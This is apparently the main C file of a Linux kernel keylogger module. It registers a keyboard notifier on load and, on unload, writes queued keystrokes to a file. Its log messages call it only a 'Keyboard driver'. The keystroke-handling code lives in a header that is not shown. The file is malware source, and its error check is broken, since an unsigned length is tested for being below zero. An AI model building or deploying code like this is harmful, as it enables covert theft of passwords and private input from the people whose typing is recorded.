#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/file.h>

#include "headers.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wizarddos");


static int __init keyboard_init(void) {
    printk(KERN_INFO "Keyboard driver loaded.\n");
    register_keyboard_notifier(&nb);
    return 0;
}

static void __exit keyboard_exit(void) {
    unregister_keyboard_notifier(&nb);
    if(strlen(queued_chars) > 0){
        size_t len = write_to_file(queued_chars);
        if(len < 0){
            printk(KERN_DEBUG "Failed to save to the buffer");
        }
    }
    printk(KERN_INFO "Keyboard driver unloaded.\n");
}

module_init(keyboard_init);
module_exit(keyboard_exit);